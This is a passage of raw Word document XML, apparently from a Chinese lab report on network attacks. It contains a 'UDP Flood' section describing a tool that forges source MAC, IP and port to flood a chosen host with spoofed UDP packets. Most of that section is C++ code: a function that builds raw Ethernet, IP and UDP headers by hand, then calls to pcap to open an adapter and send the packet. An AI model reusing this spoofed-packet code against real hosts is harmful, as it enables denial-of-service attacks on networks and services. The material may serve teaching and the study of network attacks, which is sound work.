    <w:p w14:paraId="4A36C56E" w14:textId="4924ED4E" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00513CE4">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3240EA3F" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_close(t);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA93257" w14:textId="69B92DF5" w:rsidR="00D51734" w:rsidRPr="00A304EC" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39EE0C5D" w14:textId="28C1A59D" w:rsidR="0080765D" w:rsidRPr="00C40D86" w:rsidRDefault="00D51734" w:rsidP="0080765D">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1130" w:name="_Toc482522657"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:rPrChange w:id="1131" w:author="李勇" w:date="2017-05-13T21:44:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>UDP Flood</w:t>
      </w:r>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:rPrChange w:id="1132" w:author="李勇" w:date="2017-05-13T21:44:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>攻击</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1130"/>
    </w:p>
    <w:p w14:paraId="6780B410" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1133" w:name="_Toc482522658"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>数据包的构建</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1133"/>
    </w:p>
    <w:p w14:paraId="4860834C" w14:textId="77777777" w:rsidR="00DE452C" w:rsidRDefault="00DE452C" w:rsidP="00DE452C">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A4447A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>UDP Flood攻击程序根据用户设定的参数，伪造源MAC、源IP和源端口，向指定主机发送大量的伪造的UDP报文, 对指定的主机进行攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F88BB54" w14:textId="54DCFC89" w:rsidR="0080765D" w:rsidRDefault="00FA6980" w:rsidP="00FA6980">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pP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4B876679" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>void RawPacket::CreatePacket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24730B72" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>(unsigned char* SourceMAC,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8AE5EF" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned char* DestinationMAC,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A3F3A4" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned int   SourceIP,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C6B11F" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned int   DestIP,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C85C43B" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned short SourcePort,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C600B3" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned short DestinationPort,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711590D7" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned char* UserData,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636282B0" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned int   UserDataLen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553C7A12" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C23E01B" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>RawPacket::UserDataLen = UserDataLen;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57591DEF" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">FinalPacket = new unsigned char[UserDataLen + 42]; // Reserve enough memory for the length of the data plus 42 bytes of headers </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DE4786" w14:textId="77777777" w:rsidR="0080765D" w:rsidRPr="000F5F92" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT TotalLen = UserDataLen + 20 + 8; // IP Header uses length of data plus length of ip header (usually 20 bytes) plus lenght of udp header (usually 8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6A9029" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//Beginning of Ethernet II Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25293C61" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>memcpy((void*)FinalPacket, (void*)DestinationMAC, 6);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FE13A7" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 6), (void*)SourceMAC, 6);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6344D345" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT TmpType = 8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6269E398" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//USHORT TmpType = 0x8864;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A492C3" w14:textId="72EC2F57" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 12), (void*)&amp;TmpType, 2); //The type of protocol used. (USHORT) Type 0x08 is UDP. You can change this</w:t>
      </w:r>
      <w:r w:rsidR="00390D52">
        <w:t xml:space="preserve"> for other protocols (e.g. TCP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499F28AB" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>// Beginning of IP Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E7FC30" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 14), (void*)"\x45", 1); //The Version (4) in the first 3 bits  and the header length on the last 5. (Im not sure, if someone could correct me plz do)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C2B5FF" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">//If you wanna do any IPv6 stuff, you will need to change this. but i still don't know how to do ipv6 myself =s </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCCDB83" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">memcpy((void*)(FinalPacket + 15), (void*)"\x00", 1); //Differntiated services field. Usually 0 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210E35AA" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(TotalLen);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392D8503" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 16), (void*)&amp;TmpType, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22549E28" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(0x1337);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234424BF" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 18), (void*)&amp;TmpType, 2);// Identification. Usually not needed to be anything specific, esp in udp. 2 bytes (Here it is 0x1337</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0842806B" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">memcpy((void*)(FinalPacket + 20), (void*)"\x00", 1); // Flags. These are not usually used in UDP either, more used in TCP for fragmentation and syn acks i think </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4531DB" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 21), (void*)"\x00", 1); // Offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B96861C" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 22), (void*)"\x80", 1); // Time to live. Determines the amount of time the packet can spend trying to get to the other computer. (I see 128 used often for this)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A3BB35" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 23), (void*)"\x11", 1);// Protocol. UDP is 0x11 (17) TCP is 6 ICMP is 1 etc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C51D4B1" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">memcpy((void*)(FinalPacket + 24), (void*)"\x00\x00", 2); //checksum </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A596E7C" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 26), (void*)&amp;SourceIP, 4); //inet_addr does htonl() for us</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F038FA" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 30), (void*)&amp;DestIP, 4);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C6B5EB" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//Beginning of UDP Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3DF62E" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(SourcePort);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2719F537" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 34), (void*)&amp;TmpType, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E102CB" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(DestinationPort);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3834E7FC" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 36), (void*)&amp;TmpType, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B477E6" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT UDPTotalLen = htons(UserDataLen + 8); // UDP Length does not include length of IP header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0668AC18" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 38), (void*)&amp;UDPTotalLen, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789EB9A8" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//memcpy((void*)(FinalPacket+40),(void*)&amp;TmpType,2); //checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4550EC" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 42), (void*)UserData, UserDataLen);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3E6759" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>unsigned short UDPChecksum = CalculateUDPChecksum(UserData, UserDataLen, SourceIP, DestIP, htons(SourcePort), htons(DestinationPort), 0x11);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170F6D51" w14:textId="77777777" w:rsidR="0080765D" w:rsidRPr="000F5F92" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 40), (void*)&amp;UDPChecksum, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E187CE" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>unsigned short IPChecksum = htons(CalculateIPChecksum(TotalLen, 0x1337, SourceIP, DestIP));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7823B955" w14:textId="77777777" w:rsidR="0080765D" w:rsidRPr="000F5F92" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 24), (void*)&amp;IPChecksum, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D89E75F" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D38E7C" w14:textId="725EA987" w:rsidR="0080765D" w:rsidRPr="008776FD" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360DF54D" w14:textId="22039109" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1134" w:name="_Toc482522659"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>数据包的发送</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1134"/>
    </w:p>
    <w:p w14:paraId="3B115307" w14:textId="232B0DF6" w:rsidR="008D0304" w:rsidRDefault="008D0304" w:rsidP="008D0304">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）调用</w:t>
      </w:r>
      <w:r>
        <w:t>pcap_open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数打开网卡</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50886509" w14:textId="2BF083BB" w:rsidR="0080765D" w:rsidRDefault="008D0304" w:rsidP="008D0304">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）调用</w:t>
      </w:r>
      <w:r>
        <w:t>pcap_sendpacket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数发送组建好的数据包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B98F0D9" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="555C81DB" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char Error[256];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EEA445" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_t* t;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5620D29E" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>t = pcap_open(Device-&gt;name, 65535, PCAP_OPENFLAG_DATATX_UDP, 1, NULL, Error);//FP for send</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443CD249" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>/*pcap_sendpacket(t, FinalPacket, UserDataLen + 42);*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5C2105" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (pcap_sendpacket(t, FinalPacket, UserDataLen + 42) == 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256BA93D" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E485CB5" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; "send success\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29195389" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA6890F" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE4D991" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7B76B4" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; "send error\n";</w:t>
      </w:r>
    </w:p>
